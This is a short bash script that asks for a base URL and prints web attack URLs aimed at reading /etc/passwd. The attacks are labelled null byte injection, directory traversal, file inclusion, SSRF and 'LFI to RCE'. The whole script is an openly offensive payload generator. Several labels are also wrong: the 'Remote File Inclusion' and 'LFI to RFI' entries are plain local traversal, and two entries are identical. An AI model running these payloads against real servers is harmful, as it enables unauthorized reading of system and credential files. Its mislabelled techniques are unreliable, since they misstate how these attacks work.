#!/bin/bash

# Function to generate directory traversal attacks
generate_attacks() {
    local url=$1

    echo "Null Byte Injection:"
    echo "${url}/etc/passwd%00"
    echo

    echo "Directory Traversal:"
    echo "${url}/../../../etc/passwd"
    echo

    echo "Relative Path Traversal:"
    echo "${url}/../../../etc/passwd"
    echo

    echo "File Inclusion:"
    echo "${url}/include/../../../etc/passwd"
    echo

    echo "Remote File Inclusion:"
    echo "${url}/index.php?page=../../../etc/passwd"
    echo

    echo "Server-Side Request Forgery (SSRF):"
    echo "${url}/api?url=http://localhost/../../../etc/passwd"
    echo

    echo "LFI to RFI:"
    echo "${url}/include/script.php?page=../../../etc/passwd"
    echo

    echo "LFI to RCE:"
    echo "${url}/include/script.php?page=../../../etc/passwd&cmd=whoami"
    echo
}

# Function to ask for the URL
ask_url() {
    read -p "Enter the base URL: " url
    echo
    generate_attacks "$url"
}

# Main script execution
ask_url